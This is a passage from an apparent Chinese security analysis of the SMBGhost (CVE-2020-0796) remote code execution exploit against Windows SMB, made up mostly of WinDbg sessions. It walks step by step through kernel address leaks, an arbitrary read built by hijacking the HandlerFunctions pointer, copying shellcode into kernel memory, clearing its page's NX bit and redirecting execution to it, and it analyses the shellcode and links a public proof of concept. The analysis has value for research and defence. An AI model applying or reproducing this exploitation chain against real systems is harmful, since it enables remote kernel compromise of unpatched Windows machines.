可利用上述流程，将指定地址处的数据再加0x50的值复制到pMdl2指向的结构中，然后再利用之前的方法逐字节泄露。思路是通过覆盖两个pmdl指针，覆盖pmdl1指针为AcceptSocket指针减0x18，这和MDL结构相关，如下所示，其偏移0x18处为MappedSystemVa指针，这样可使得AcceptSocket地址正好存放在pMdl1-&gt;MappedSystemVa。然后覆盖pmdl2指针为一个可控的内存，POC中为之前泄露的0x2100内存的指针加0x1250偏移处。这样上述代码执行后，就会将AcceptSocket地址的信息存放在pmdl2指向的MDL结构（已知地址）中。

```
kd&gt; dt _mdl
win32k!_MDL
   +0x000 Next             : Ptr64 _MDL
   +0x008 Size             : Int2B
   +0x00a MdlFlags         : Int2B
   +0x00c AllocationProcessorNumber : Uint2B
   +0x00e Reserved         : Uint2B
   +0x010 Process          : Ptr64 _EPROCESS
   +0x018 MappedSystemVa   : Ptr64 Void
   +0x020 StartVa          : Ptr64 Void
   +0x028 ByteCount        : Uint4B
   +0x02c ByteOffset       : Uint4B

kd&gt; ?ffffa50834803a18-58+100-18
Evaluate expression: -100020317570392 = ffffa508`34803aa8

kd&gt; ?ffffa50836240000+1250  //这个和no transport header相关
Evaluate expression: -100020290055600 = ffffa508`36241250

//覆盖前
kd&gt; dd ffffa508`31ab9050+10138
ffffa508`31ac9188  31ac91e0 ffffa508 00000000 00000000
ffffa508`31ac9198  00000000 00000000 31ac92a0 ffffa508
ffffa508`31ac91a8  00000000 00000000 00000000 00000000

//覆盖后
kd&gt; dd ffffa508`31ac9188
ffffa508`31ac9188  34803aa8 ffffa508 00000000 00000000
ffffa508`31ac9198  00000000 00000000 36241250 ffffa508
ffffa508`31ac91a8  00000000 00000000 00000000 00000000
```

之后通过解压覆盖偏移0x10处的BufferFlags，使其由2变为3，压缩数据后面加入多个”\xFF”使得解压失败，这样在后续调用 SrvNetFreeBuffer函数时才能进入上述流程。其中：flag第一个比特位被设置代表没有Transport Header，所以那段代码实际上是留出了传输头。

```
kd&gt; dd r9-10
ffffa508`31ac9150  00000000 00000000 34ba42d8 ffffa508
ffffa508`31ac9160  00040002 00000000 31ab9050 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

kd&gt; dd ffffa508`31ac9150
ffffa508`31ac9150  00000000 00000000 34ba42d8 ffffa508
ffffa508`31ac9160  00040003 00000000 31ab9050 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

```

当调用SrvNetFreeBuffer释放这个缓冲区时会触发那段流程，此时想泄露的数据已经放在了0xffffa50836241250处的MDL结构中。如下所示，为0xffffa5083506b848。然后再用之前的方法依次泄露0xffffa50836241250偏移0x2D、0x2C、0x25、0x24、0x23、0x22、0x21处的字节，然后组合成0xffffa5083506b848。

```
kd&gt; dt _mdl ffffa50836241250 
win32k!_MDL
   +0x000 Next             : (null) 
   +0x008 Size             : 0n56
   +0x00a MdlFlags         : 0n4
   +0x00c AllocationProcessorNumber : 0
   +0x00e Reserved         : 0
   +0x010 Process          : (null) 
   +0x018 MappedSystemVa   : (null) 
   +0x020 StartVa          : 0xffffa508`3506b000 Void
   +0x028 ByteCount        : 0xffffffb0
   +0x02c ByteOffset       : 0x848

kd&gt; db ffffa50836241250 
ffffa508`36241250  00 00 00 00 00 00 00 00-38 00 04 00 00 00 00 00  ........8.......
ffffa508`36241260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`36241270  00 b0 06 35 08 a5 ff ff-b0 ff ff ff 48 08 00 00  ...5........H...

kd&gt; ?poi(ffffa508`34803aa8+18)   //AcceptSocket - 0x50
Evaluate expression: -100020308756408 = ffffa508`3506b848
```

由于之前flag加上了1，没有传输头，所以SRVNET_BUFFER_HDR偏移0x18处的user data指针比之前多0x50（计算偏移的时候要注意）。这次将BufferFlags覆盖为0，在SrvNetFreeBuffer函数中就不会将其直接加入SrvNetBufferLookasides表，而是释放该缓冲区。

```
kd&gt; dd r9-10
ffffa508`31ac9150  00000000 00000000 35caba58 ffffa508
ffffa508`31ac9160  00040002 00000000 31ab90a0 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

kd&gt; dd ffffa508`31ac9150
ffffa508`31ac9150  00000000 00000000 35caba58 ffffa508
ffffa508`31ac9160  00040000 00000000 31ab90a0 ffffa508
ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
ffffa508`31ac9190  00000000 00000000 00000000 00000000
ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000

```

后面还是和之前一样，依次从高地址到低地址泄露每一个字节，经过组合最终得到后面还是和之前一样，依次从高地址到低地址泄露每一个字节，经过组合最终得到AcceptSocket地址为 0xffffa5083506b848 – 0x50 = 0xffffa508`3506b7f8。

```
kd&gt; db ffffa508`36241250+2d-10
ffffa508`3624126d  00 00 00 00 b0 06 35 08-a5 ff ff b0 ff ff ff 48  ......5........H
ffffa508`3624127d  08 b0 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`3624128d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`3624129d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412ad  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412bd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412cd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`362412dd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................................

kd&gt; u poi(ffffa508`3506b7f8+30)
srvnet!SrvNetWskConnDispatch:
fffff802`57d3d170 50              push    rax
fffff802`57d3d171 5a              pop     rdx
fffff802`57d3d172 d15702          rcl     dword ptr [rdi+2],1
fffff802`57d3d175 f8              clc
fffff802`57d3d176 ff              ???
fffff802`57d3d177 ff00            inc     dword ptr [rax]
fffff802`57d3d179 6e              outs    dx,byte ptr [rsi]
fffff802`57d3d17a d15702          rcl     dword ptr [rdi+2],1
```

采用同样的方法可获取AcceptSocket偏移0x30处的srvnet!SrvNetWskConnDispatch函数的地址。

### <a class="reference-link" name="%E6%B3%84%E9%9C%B2ntoskrnl%E5%9F%BA%E5%9D%80"></a>泄露ntoskrnl基址

**任意地址读**

SrvNetCommonReceiveHandler函数中存在如下代码，其中v10指向SRVNET_RECV结构体，以下代码是对srv2!Srv2ReceiveHandler函数的调用（HandlerFunctions表中的第二项），第一个参数来自于SRVNET_RECV结构体偏移0x128处，第二个参数来自于SRVNET_RECV结构体偏移0x130处。可通过覆盖SRVNET_RECV结构偏移0x118、0x128、0x130处的数据，进行已知函数的调用（参数个数不大于2）。

```
//srvnet!SrvNetCommonReceiveHandler
  v32 = *(_QWORD *)(v10 + 0x118);
  v33 = *(_QWORD *)(v10 + 0x130);
  v34 = *(_QWORD *)(v10 + 0x128);
  *(_DWORD *)(v10 + 0x144) = 3;
  v35 = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD, __int64, __int64, __int64, __int64, __int64))(v32 + 8))( v34, v33, v8, (unsigned int)v11, v9, a5, v7, a7, v55);
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b0bdebd2b39627c3.png)

以下为RtlCopyUnicodeString函数部分代码，该函数可通过srvnet!imp_RtlCopyUnicodeString索引，并且只需要两个参数（PUNICODE_STRING结构）。如下所示，PUNICODE_STRING中包含Length、MaximumLength（偏移2）和Buffer（偏移8）。RtlCopyUnicodeString函数会调用memmove将SourceString-&gt;Buffer复制到DestinationString-&gt;Buffer，复制长度为SourceString-&gt;Length和DestinationString-&gt;MaximumLength中的最小值。

```
//RtlCopyUnicodeString
void __stdcall RtlCopyUnicodeString(PUNICODE_STRING DestinationString, PCUNICODE_STRING SourceString)
`{`
  v2 = DestinationString;
  if ( SourceString )
  `{`
    v3 = SourceString-&gt;Length;
    v4 = DestinationString-&gt;MaximumLength;
    v5 = SourceString-&gt;Buffer;
    if ( (unsigned __int16)v3 &lt;= (unsigned __int16)v4 )
      v4 = v3;
    v6 = DestinationString-&gt;Buffer;
    v7 = v4;
    DestinationString-&gt;Length = v4;
    memmove(v6, v5, v4);

//PUNICODE_STRING
typedef struct __UNICODE_STRING_
`{`
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
`}` UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;
```

可通过覆盖HandlerFunctions，“替换”srv2!Srv2ReceiveHandler函数指针为nt!RtlCopyUnicodeString函数指针，覆盖DestinationString为已知地址的PUNICODE_STRING结构地址，SourceString为待读取地址的PUNICODE_STRING结构地址，然后通过向该连接继续发送请求实现任意地址数据读取。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d6aa9f4f9deb0c4e.png)

**ntoskrnl泄露步骤**

1、首先还是要获取一个ConnectionBufferList的地址，本次调试为0xffffa50834ba42d8。<br>
2、利用任意地址写，将特定数据写入可控的缓冲区（0x2100缓冲区）的已知偏移处。成功复制后，0xffffa50836241658处为0xffffa50836241670，正好指向复制数据的后面，0xffffa50836241668处为0xfffff80257d42210（srvnet!imp_IoSizeofWorkItem），指向nt!IoSizeofWorkItem函数（此次要泄露nt!IoSizeofWorkItem函数地址）。

```
//要复制的数据
kd&gt; dd ffffa508`36240050
ffffa508`36240050  424d53fc ffffffff 00000001 00000020
ffffa508`36240060  00060006 00000000 36241670 ffffa508
ffffa508`36240070  00060006 00000000 57d42210 fffff802

kd&gt; dd ffffa508`2fe38050+1100  //任意地址写，注意0xffffa5082fe39168处数据
ffffa508`2fe39150  35c3e150 ffffa508 34803a18 ffffa508
ffffa508`2fe39160  00000002 00000000 2fe38050 ffffa508
ffffa508`2fe39170  00001100 00000000 00001278 00000400
kd&gt; p
srv2!Srv2DecompressData+0xe1:
fffff802`51ce7f41 85c0            test    eax,eax
kd&gt; dd ffffa508`2fe38050+1100 //要复制的可控地址（0x18处）
ffffa508`2fe39150  00000000 00000000 00000000 00000000
ffffa508`2fe39160  00000000 00000000 36241650 ffffa508
ffffa508`2fe39170  00001100 00000000 00001278 00000400

kd&gt; g
copy: ffffa508`36241650  00000000`00000000 00000000`00000000
srv2!Srv2DecompressData+0x108:
fffff802`51ce7f68 e85376ffff      call    srv2!memcpy (fffff802`51cdf5c0)
kd&gt; dd rcx
ffffa508`36241650  00000000 00000000 00000000 00000000
ffffa508`36241660  00000000 00000000 00000000 00000000
kd&gt; p
srv2!Srv2DecompressData+0x10d:
fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
kd&gt; dd ffffa508`36241650  //成功复制
ffffa508`36241650  00060006 00000000 36241670 ffffa508
ffffa508`36241660  00060006 00000000 57d42210 fffff802

//nt!IoSizeofWorkItem函数指针
kd&gt; u poi(fffff80257d42210)
nt!IoSizeofWorkItem:
fffff802`52c7f7a0 b858000000      mov     eax,58h
fffff802`52c7f7a5 c3              ret
```

3、利用任意地址写将srvnet!imp_RtlCopyUnicodeString指针-8的地址写入SRVNET_RECV结构偏移0x118处的HandlerFunctions，这样系统会认为nt!RtlCopyUnicodeString指针是srv2!Srv2ReceiveHandler函数指针。

```
kd&gt; dd 0xffffa50834ba42d8-58+118    //HandlerFunctions
ffffa508`34ba4398  3479cd18 ffffa508 2f4a6dc0 ffffa508
ffffa508`34ba43a8  34ae4170 ffffa508 34f2a040 ffffa508

kd&gt; u poi(ffffa5083479cd18+8)    //覆盖前第二项为srv2!Srv2ReceiveHandler函数指针
srv2!Srv2ReceiveHandler:
fffff802`51cdc3b0 44894c2420      mov     dword ptr [rsp+20h],r9d
fffff802`51cdc3b5 53              push    rbx
fffff802`51cdc3b6 55              push    rbp
fffff802`51cdc3b7 4154            push    r12
fffff802`51cdc3b9 4155            push    r13
fffff802`51cdc3bb 4157            push    r15
fffff802`51cdc3bd 4883ec70        sub     rsp,70h
fffff802`51cdc3c1 488b8424d8000000 mov     rax,qword ptr [rsp+0D8h]

kd&gt; g
copy: ffffa508`34ba4398  ffffa508`3479cd18 ffffa508`2f4a6dc0
srv2!Srv2DecompressData+0x108:
fffff802`51ce7f68 e85376ffff      call    srv2!memcpy (fffff802`51cdf5c0)
kd&gt; p
srv2!Srv2DecompressData+0x10d:
fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
kd&gt; dq ffffa508`34ba4398
ffffa508`34ba4398  fffff802`57d42280 ffffa508`2f4a6dc0
ffffa508`34ba43a8  ffffa508`34ae4170 ffffa508`34f2a040
kd&gt; u poi(fffff802`57d42280+8)    //覆盖前第二项为nt!RtlCopyUnicodeString函数指针
nt!RtlCopyUnicodeString:
fffff802`52d1c170 4057            push    rdi
fffff802`52d1c172 4883ec20        sub     rsp,20h
fffff802`52d1c176 488bc2          mov     rax,rdx
fffff802`52d1c179 488bf9          mov     rdi,rcx
fffff802`52d1c17c 4885d2          test    rdx,rdx
fffff802`52d1c17f 745b            je      nt!RtlCopyUnicodeString+0x6c (fffff802`52d1c1dc)
fffff802`52d1c181 440fb700        movzx   r8d,word ptr [rax]
fffff802`52d1c185 0fb74102        movzx   eax,word ptr [rcx+2]

```

4、利用任意地址写分别将两个参数写入SRVNET_RECT结构的偏移0x128和0x130处，为HandlerFunctions中函数的前两个参数。

```
kd&gt; dd 0xffffa50834ba42d8-58+118
ffffa508`34ba4398  57d42280 fffff802 2f4a6dc0 ffffa508
ffffa508`34ba43a8  36241650 ffffa508 36241660 ffffa508
```

5、向原始连接发送请求，等待srv2!Srv2ReceiveHandler函数（nt!RtlCopyUnicodeString函数）被调用，函数执行后，nt!IoSizeofWorkItem函数的低6个字节成功被复制到目标地址。

```
kd&gt; dq ffffa508`36241670 
ffffa508`36241670  0000f802`52c7f7a0 00000000`00000000
ffffa508`36241680  00000000`00000000 00000000`00000000
ffffa508`36241690  00000000`00000000 00000000`00000000

kd&gt; u fffff802`52c7f7a0
nt!IoSizeofWorkItem:
fffff802`52c7f7a0 b858000000      mov     eax,58h
fffff802`52c7f7a5 c3              ret

```

6、然后利用之前的方式将这6个字节依次泄露出来，加上0xffff000000000000，减去IoSizeofWorkItem函数在模块中的偏移得到ntoskrnl基址。

### <a class="reference-link" name="Shellcode%E5%A4%8D%E5%88%B6&amp;&amp;%E6%89%A7%E8%A1%8C"></a>Shellcode复制&amp;&amp;执行

1、获取PTE基址

利用任意地址读读取nt!MiGetPteAddress函数偏移0x13处的地址，低6位即可。然后加上0xffff000000000000得到PTE基址为0xFFFFF10000000000（0xfffff80252d03d39处第二个操作数）。

```
kd&gt; u nt!MiGetPteAddress
nt!MiGetPteAddress:
fffff802`52d03d28 48c1e909        shr     rcx,9
fffff802`52d03d2c 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
fffff802`52d03d36 4823c8          and     rcx,rax
fffff802`52d03d39 48b80000000000f1ffff mov rax,0FFFFF10000000000h
fffff802`52d03d43 4803c1          add     rax,rcx
fffff802`52d03d46 c3              ret

d&gt; db nt!MiGetPteAddress + 13 l8
fffff802`52d03d3b  00 00 00 00 00 f1 ff ff                          ........
```

2、利用任意地址写将Shellcode复制到0xFFFFF78000000800处，在后续章节会对Shellcode进行进一步分析。

```
kd&gt; u 0xFFFFF78000000800
fffff780`00000800 55              push    rbp
fffff780`00000801 e807000000      call    fffff780`0000080d
fffff780`00000806 e819000000      call    fffff780`00000824
fffff780`0000080b 5d              pop     rbp
fffff780`0000080c c3              ret
fffff780`0000080d 488d2d00100000  lea     rbp,[fffff780`00001814]
fffff780`00000814 48c1ed0c        shr     rbp,0Ch
fffff780`00000818 48c1e50c        shl     rbp,0Ch

```

3、计算Shellcode的PTE，依然采用nt!MiGetPteAddress函数中的计算公式。((0xFFFFF78000000800 &gt;&gt; 9 ) &amp; 0x7FFFFFFFF8) + 0xFFFFF10000000000 = 0xFFFFF17BC0000000。然后取出Shellcode PTE偏移7处的字节并和0x7F相与之后放回原处，去除NX标志位。

```
kd&gt; db fffff17b`c0000000    //去NX标志前
fffff17b`c0000000  63 39 fb 00 00 00 00 80-00 00 00 00 00 00 00 00  c9..............
fffff17b`c0000010  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

kd&gt; dt _MMPTE_HARDWARE fffff17b`c0000000
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000000111110110011 (0xfb3)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y1

kd&gt; db fffff17b`c0000000    //去NX标志后
fffff17b`c0000000  63 39 fb 00 00 00 00 00-00 00 00 00 00 00 00 00  c9..............
fffff17b`c0000010  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
kd&gt; dt _MMPTE_HARDWARE fffff17b`c0000000
nt!_MMPTE_HARDWARE
   +0x000 Valid            : 0y1
   +0x000 Dirty1           : 0y1
   +0x000 Owner            : 0y0
   +0x000 WriteThrough     : 0y0
   +0x000 CacheDisable     : 0y0
   +0x000 Accessed         : 0y1
   +0x000 Dirty            : 0y1
   +0x000 LargePage        : 0y0
   +0x000 Global           : 0y1
   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000000111110110011 (0xfb3)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y0
```

4、利用任意地址写将Shellcode地址（0xFFFFF78000000800）放入可控地址，然后采用已知函数调用的方法用指向Shellcode指针的可控地址减8的值覆写HandlerFunctions。使得HandlerFunctions中的srv2!Srv2ReceiveHandler函数指针被覆盖为Shellcode地址。然后向该连接发包，等待Shellcode被调用。另外，由于ntoskrnl基址已经被泄露出来，可以将其作为参数传给Shellcode，在Shellcode中就不需要获取ntoskrnl基址了。

```
kd&gt; dq ffffa508`34ba42d8-58+118 l1
ffffa508`34ba4398  ffffa508`36241648

kd&gt; u poi(ffffa508`36241648+8)
fffff780`00000800 55              push    rbp
fffff780`00000801 e807000000      call    fffff780`0000080d
fffff780`00000806 e819000000      call    fffff780`00000824
fffff780`0000080b 5d              pop     rbp
fffff780`0000080c c3              ret
fffff780`0000080d 488d2d00100000  lea     rbp,[fffff780`00001814]
fffff780`00000814 48c1ed0c        shr     rbp,0Ch
fffff780`00000818 48c1e50c        shl     rbp,0Ch

kd&gt; dq ffffa508`34ba42d8-58+128 l1
ffffa508`34ba43a8  fffff802`52c12000

kd&gt; lmm nt
Browse full module list
start             end                 module name
fffff802`52c12000 fffff802`536c9000   nt         (pdb symbols)          C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\5A8A70EAE29939EFA17C9FC879FA0D901\ntkrnlmp.pdb

kd&gt; g
Breakpoint 0 hit
fffff780`00000800 55              push    rbp
kd&gt; r rcx    //ntoskrnl基址
rcx=fffff80252c12000

```



## Shellcode分析

本分析参考以下链接：[https://github.com/ZecOps/CVE-2020-0796-RCE-POC/blob/master/smbghost_kshellcode_x64.asm](https://github.com/ZecOps/CVE-2020-0796-RCE-POC/blob/master/smbghost_kshellcode_x64.asm)

### <a class="reference-link" name="%E5%AF%BB%E6%89%BEntoskrnl.exe%E5%9F%BA%E5%9D%80"></a>寻找ntoskrnl.exe基址

获取内核模块基址在漏洞利用中是很关键的事情，在后面会用到它的很多导出函数。这里列出常见的一种获取ntoskrnl.exe基址的思路：<br>
通过KPCR找到IdtBase，然后根据IdtBase寻找中断0的ISR入口点，该入口点属于ntoskrnl.exe模块，所以可以在找到该地址后向前搜索找到ntoskrnl.exe模块基址。<br>
在64位系统中，GS段寄存器在内核态会指向KPCR，KPCR偏移0x38处为IdtBase：

```
3: kd&gt; rdmsr 0xC0000101
msr[c0000101] = ffffdc81`fe1c1000

3: kd&gt; dt _kpcr ffffdc81`fe1c1000
nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : 0xffffdc81`fe1d6fb0 _KGDTENTRY64
   +0x008 TssBase          : 0xffffdc81`fe1d5000 _KTSS64
   +0x010 UserRsp          : 0x10ff588
   +0x018 Self             : 0xffffdc81`fe1c1000 _KPCR
   +0x020 CurrentPrcb      : 0xffffdc81`fe1c1180 _KPRCB
   +0x028 LockArray        : 0xffffdc81`fe1c1870 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : 0x00000000`00e11000 Void
   +0x038 IdtBase          : 0xffffdc81`fe1d4000 _KIDTENTRY64
   ......
   +0x180 Prcb             : _KPRCB

```

ISR入口点在_KIDTENTRY64结构体中被分成三部分：OffsetLow、OffsetMiddle 以及 OffsetHigh。其计算公式为：( OffsetHigh &lt;&lt; 32 ) | ( OffsetMiddle &lt;&lt; 16 ) | OffsetLow ，如下所示，本次调试的入口地址实际上是0xfffff8004f673d00，该地址位于ntoskrnl.exe模块。

```
3: kd&gt; dx -id 0,0,ffff818c6286f040 -r1 ((ntkrnlmp!_KIDTENTRY64 *)0xffffdc81fe1d4000)
((ntkrnlmp!_KIDTENTRY64 *)0xffffdc81fe1d4000)                 : 0xffffdc81fe1d4000 [Type: _KIDTENTRY64 *]
    [+0x000] OffsetLow        : 0x3d00 [Type: unsigned short]
    [+0x002] Selector         : 0x10 [Type: unsigned short]
    [+0x004 ( 2: 0)] IstIndex         : 0x0 [Type: unsigned short]
    [+0x004 ( 7: 3)] Reserved0        : 0x0 [Type: unsigned short]
    [+0x004 (12: 8)] Type             : 0xe [Type: unsigned short]
    [+0x004 (14:13)] Dpl              : 0x0 [Type: unsigned short]
    [+0x004 (15:15)] Present          : 0x1 [Type: unsigned short]
    [+0x006] OffsetMiddle     : 0x4f67 [Type: unsigned short]
    [+0x008] OffsetHigh       : 0xfffff800 [Type: unsigned long]
    [+0x00c] Reserved1        : 0x0 [Type: unsigned long]
    [+0x000] Alignment        : 0x4f678e0000103d00 [Type: unsigned __int64]

3: kd&gt; u 0xfffff8004f673d00
nt!KiDivideErrorFault:
fffff800`4f673d00 4883ec08        sub     rsp,8
fffff800`4f673d04 55              push    rbp
fffff800`4f673d05 4881ec58010000  sub     rsp,158h
fffff800`4f673d0c 488dac2480000000 lea     rbp,[rsp+80h]
fffff800`4f673d14 c645ab01        mov     byte ptr [rbp-55h],1
fffff800`4f673d18 488945b0        mov     qword ptr [rbp-50h],rax
```

可直接取IdtBase偏移4处的QWORD值，与0xfffffffffffff000相与，然后进行页对齐向前搜索，直到匹配到魔值”\x4D\x5A”（MZ），此时就得到了ntoskrnl.exe基址。有了ntoskrnl.exe模块的基址，就可以通过遍历导出表获取相关函数的地址。

```
3: kd&gt; dq 0xffffdc81`fe1d4000+4 l1
ffffdc81`fe1d4004  fffff800`4f678e00

3: kd&gt; lmm nt
Browse full module list
start             end                 module name
fffff800`4f4a7000 fffff800`4ff5e000   nt         (pdb symbols)          C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\5A8A70EAE29939EFA17C9FC879FA0D901\ntkrnlmp.pdb

3: kd&gt; db fffff800`4f4a7000
fffff800`4f4a7000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............
fffff800`4f4a7010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......
fffff800`4f4a7020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
fffff800`4f4a7030  00 00 00 00 00 00 00 00-00 00 00 00 08 01 00 00  ................
fffff800`4f4a7040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th
fffff800`4f4a7050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno
fffff800`4f4a7060  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS 
fffff800`4f4a7070  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......
```

### <a class="reference-link" name="%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87KTHREAD%E7%BB%93%E6%9E%84"></a>获取目标KTHREAD结构

在x64系统上（调试环境），KPCR偏移0x180处为KPRCB结构，KPRCB结构偏移8处为_KTHREAD结构的CurrentThread。_KTHREAD结构偏移0x220处为 _KPROCESS结构。KPROCESS结构为EPROCESS的第一项，EPROCESS结构偏移0x488为_LIST_ENTRY结构的ThreadListHead。

```
3: kd&gt; dt nt!_kpcr ffffdc81`fe1c1000
nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : 0xffffdc81`fe1d6fb0 _KGDTENTRY64
   +0x008 TssBase          : 0xffffdc81`fe1d5000 _KTSS64
   +0x010 UserRsp          : 0x10ff588
   +0x018 Self             : 0xffffdc81`fe1c1000 _KPCR
   +0x020 CurrentPrcb      : 0xffffdc81`fe1c1180 _KPRCB
   +0x028 LockArray        : 0xffffdc81`fe1c1870 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : 0x00000000`00e11000 Void
   +0x038 IdtBase          : 0xffffdc81`fe1d4000 _KIDTENTRY64
   ......
   +0x180 Prcb             : _KPRCB

3: kd&gt; dx -id 0,0,ffff818c6286f040 -r1 (*((ntkrnlmp!_KPRCB *)0xffffdc81fe1c1180))
(*((ntkrnlmp!_KPRCB *)0xffffdc81fe1c1180))                 [Type: _KPRCB]
    [+0x000] MxCsr            : 0x1f80 [Type: unsigned long]
    [+0x004] LegacyNumber     : 0x3 [Type: unsigned char]
    [+0x005] ReservedMustBeZero : 0x0 [Type: unsigned char]
    [+0x006] InterruptRequest : 0x0 [Type: unsigned char]
    [+0x007] IdleHalt         : 0x1 [Type: unsigned char]
    [+0x008] CurrentThread    : 0xffffdc81fe1d2140 [Type: _KTHREAD *]

3: kd&gt; dx -id 0,0,ffff818c6286f040 -r1 ((ntkrnlmp!_KTHREAD *)0xffffdc81fe1d2140)
((ntkrnlmp!_KTHREAD *)0xffffdc81fe1d2140)                 : 0xffffdc81fe1d2140 [Type: _KTHREAD *]
    [+0x000] Header           [Type: _DISPATCHER_HEADER]
    [+0x018] SListFaultAddress : 0x0 [Type: void *]
    [+0x020] QuantumTarget    : 0x791ddc0 [Type: unsigned __int64]
    [+0x028] InitialStack     : 0xfffff6074c645c90 [Type: void *]
    [+0x030] StackLimit       : 0xfffff6074c640000 [Type: void *]
    [+0x038] StackBase        : 0xfffff6074c646000 [Type: void *]
    ......
    [+0x220] Process          : 0xfffff8004fa359c0 [Type: _KPROCESS *]

3: kd&gt; dt _eprocess 0xfffff8004fa359c0
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : (null) 
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
   ......
   +0x450 ImageFileName    : [15]  "Idle"
   ......
   +0x488 ThreadListHead   : _LIST_ENTRY [ 0xfffff800`4fa38ab8 - 0xffffdc81`fe1d27f8 ]
+ nt!PsGetProcessImageFileName
```

通过此函数得到ImageFileName在EPROCESS中的偏移（0x450），然后通过一些判断和计算获得ThreadListHead在EPROCESS中的偏移（调试环境为0x488）。
- nt!IoThreadToProcess
从KTHREAD结构中得到KPROCESS（EPROCESS）结构体的地址（偏移0x220处）。然后通过之前计算出的偏移获取ThreadListHead结构，通过访问ThreadListHead结构获取ThreadListEntry（位于ETHREAD），遍历ThreadListEntry以计算KTHREAD（ETHREAD）相对于ThreadListEntry的偏移，自适应相关吧。

```
kd&gt; u rip
nt!IoThreadToProcess:
fffff805`39a79360 488b8120020000  mov     rax,qword ptr [rcx+220h]
fffff805`39a79367 c3              ret

kd&gt; g
Breakpoint 0 hit
fffff780`0000091d 4d29ce          sub     r14,r9

kd&gt; ub rip
fffff780`00000900 4d89c1          mov     r9,r8
fffff780`00000903 4d8b09          mov     r9,qword ptr [r9]
fffff780`00000906 4d39c8          cmp     r8,r9
fffff780`00000909 0f84e4000000    je      fffff780`000009f3
fffff780`0000090f 4c89c8          mov     rax,r9
